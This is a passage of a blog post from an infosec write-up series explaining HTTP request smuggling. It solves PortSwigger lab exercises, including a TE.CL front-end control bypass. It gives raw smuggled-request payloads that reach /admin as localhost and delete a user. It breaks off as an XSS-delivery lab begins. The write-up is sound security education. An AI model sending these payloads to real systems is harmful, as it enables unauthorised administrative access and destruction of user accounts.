---
title: HTTP request smuggling Explained and Exploited Part 0x3
url: https://infosecwriteups.com/http-request-smuggling-explained-and-exploited-part-0x3-b61623287603?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2022-10-26
fetch_date: 2025-10-03T20:53:48.146015
---

# HTTP request smuggling Explained and Exploited Part 0x3

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fb61623287603&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fhttp-request-smuggling-explained-and-exploited-part-0x3-b61623287603&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fhttp-request-smuggling-explained-and-exploited-part-0x3-b61623287603&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-b61623287603---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-b61623287603---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# HTTP request smuggling Explained and Exploited Part 0x3

[![Hashar Mujahid](https://miro.medium.com/v2/da:true/resize:fill:64:64/1*eIN8F1x85V9OMBf50NuoLg.gif)](https://hasharmujahid.medium.com/?source=post_page---byline--b61623287603---------------------------------------)

[Hashar Mujahid](https://hasharmujahid.medium.com/?source=post_page---byline--b61623287603---------------------------------------)

5 min read

·

Oct 25, 2022

--

Listen

Share

Hi! My name is Hashar Mujahid, and today we will continue to discuss what HTTP request smuggling vulnerabilities are and how we can exploit them.

Press enter or click to view image in full size

![]()

Img from securitybot.io

Hi, today we’re going to talk about how we can bypass the front-end security measures using HTTP request smuggling methods.

If you don't know what HTTP request smuggling is, I recommend you read my previous 2 blogs in this series.

[## HTTP request smuggling Explained and Exploited Part 0x1

### Hi! My name is Hashar Mujahid and today we will sneak a peek into Request Smuggling Vulnerabilities.

infosecwriteups.com](/http-request-smuggling-explained-and-exploited-part-0x1-89ce2956534f?source=post_page-----b61623287603---------------------------------------)

[## HTTP request smuggling Explained and Exploited Part 0x2

### Hi! My name is Hashar Mujahid, and today we will continue to discuss what HTTP request smuggling vulnerabilities are…

infosecwriteups.com](/http-request-smuggling-explained-and-exploited-part-0x2-7768d04883fb?source=post_page-----b61623287603---------------------------------------)

Now we will continue where we left off!

The security controls can be implemented on both the front end and the back end of the application. Let’s consider a scenario where the application’s front end prevents the user from accessing some directories `/admin` due to this validation. The developer didn’t put any validation in the backend, so if the attacker is somehow able to bypass the front-end security, the backend will respond to him with the response to the request.

```
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked  0
GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```

The front-end server sees two requests here, both for `/home`, and so the requests are forwarded to the backend server. However, the back-end server sees one request for `/home` and one request for `/admin`. It assumes (as always) that the requests have passed through the front-end controls, and so grants access to the restricted URL.

In part 2 we bypassed the security controls using a CL.TE attack. Now we will bypass security control using TE.CL attack.

### [Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability:](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl)

This lab involves a front-end and back-end server, and the back-end server doesn’t support chunked encoding. There’s an admin panel at `/admin`, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user `carlos`.

**SOLUTION:**

In the lab description, it is clearly stated that the front end supports `transfer encoding: chunked` but the backend server doesn’t. So access the lab and send the request to the burp repeater.

Press enter or click to view image in full size

![]()

Change the request method to POST and remove the unnecessary headers.

Press enter or click to view image in full size

![]()

Now we need to add our transfer encoding header. And also don't forget to add the trailing new lines.

We can see we are getting 200 ok response, Now we just need to figure out a way to request `/admin` which we can not access from the front end because of the security controls.

“Make sure update content length is disabled in repeater”

The next step is to create a Get request to /admin in our POST request’s body.

```
60 ==> SIZE OF OUR CHUNKED DATA
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15x=1
0
```

Press enter or click to view image in full size

![]()

We can see the admin panel is only available to the local host. To bypass this situation we need to add another host header which has a value of

Payload:

```
71
POST /admin HTTP/1.1
HOST: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15x=1
0
```

Press enter or click to view image in full size

![]()

Now we just need to delete the Carlos user.

Press enter or click to view image in full size

![]()

```
87 GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15  x=1
0
```

This payload will delete the Carlos user.

Now let's see how we can chain this vulnerability to induce XSS in the victim's browser.

### [Exploiting HTTP request smuggling to deliver reflected XSS](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)

This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding.

The application is also vulnerable to [reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) via the `User-Agent` header.

To solve the lab, smuggle a request to the back-end server that causes the next user’s request to receive a response containing an XSS exploit that executes `alert(1)`.

SOLUTION :

We can see the frontend server doesn’t support chunked encoding so we wouldn't have to update the size of our chunked data. Let’s access the lab.

We have a view blog functionality in our blog let’s visit the view blog link and send this request to the repeater.

Press enter or click to view image in full size

...